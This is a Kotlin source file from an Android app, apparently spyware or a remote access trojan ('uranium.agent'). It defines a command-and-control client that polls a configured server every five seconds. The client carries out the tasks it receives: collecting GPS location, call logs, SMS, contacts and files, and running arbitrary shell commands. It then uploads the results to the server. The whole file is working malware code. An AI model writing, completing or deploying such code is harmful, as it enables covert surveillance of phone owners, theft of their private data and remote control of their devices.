package com.uranium.agent.net

import android.content.Context
import android.os.Build
import com.uranium.agent.BuildConfig
import com.uranium.agent.crypto.DualCounterCipher
import com.uranium.agent.tasks.*
import kotlinx.coroutines.*
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.util.concurrent.TimeUnit

class C2Client(private val context: Context) {
    private val client = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .build()

    private val cipher = DualCounterCipher(BuildConfig.C2_PSK.toByteArray())
    private val baseUrl = "${BuildConfig.C2_TRANSPORT}://${BuildConfig.C2_HOST}:${BuildConfig.C2_PORT}/api/v1"

    fun startSyncLoop() {
        CoroutineScope(Dispatchers.IO).launch {
            while (true) {
                try {
                    pollServer()
                } catch (e: Exception) {
                    e.printStackTrace()
                }
                delay(5000)
            }
        }
    }

    private fun pollServer() {
        val reqJson = JSONObject().apply {
            put("node_id", SessionState.nodeId)
            put("model", Build.MODEL)
            put("os", "Android " + Build.VERSION.RELEASE)
        }

        val request = Request.Builder()
            .url("$baseUrl/stream")
            .post(reqJson.toString().toRequestBody("application/json".toMediaType()))
            .header("X-Node-Id", SessionState.nodeId)
            .build()

        client.newCall(request).execute().use { response ->
            if (response.isSuccessful) {
                val body = response.body?.string() ?: return
                val json = JSONObject(body)
                if (json.has("task")) {
                    val taskObj = json.getJSONObject("task")
                    val taskId = taskObj.optString("id")
                    val action = taskObj.optString("action")
                    val payload = taskObj.optJSONObject("payload") ?: JSONObject()
                    executeTask(taskId, action, payload)
                }
            }
        }
    }

    private fun executeTask(taskId: String, action: String, payload: JSONObject) {
        CoroutineScope(Dispatchers.IO).launch {
            val result = when (action) {
                "gps" -> GpsTask.execute(context)
                "call_logs" -> CallLogsTask.execute(context)
                "sms" -> SmsTask.execute(context)
                "contacts" -> ContactsTask.execute(context)
                "file" -> FileTask.execute(context, payload)
                "shell" -> ShellTask.execute(payload)
                else -> JSONObject().put("status", "Unknown action: $action")
            }
            sendResult(taskId, action, result)
        }
    }

    private fun sendResult(taskId: String, action: String, data: JSONObject) {
        val reqJson = JSONObject().apply {
            put("node_id", SessionState.nodeId)
            put("task_id", taskId)
            put("action", action)
            put("data", data)
        }

        val request = Request.Builder()
            .url("$baseUrl/upload")
            .post(reqJson.toString().toRequestBody("application/json".toMediaType()))
            .build()

        client.newCall(request).execute().close()
    }
}
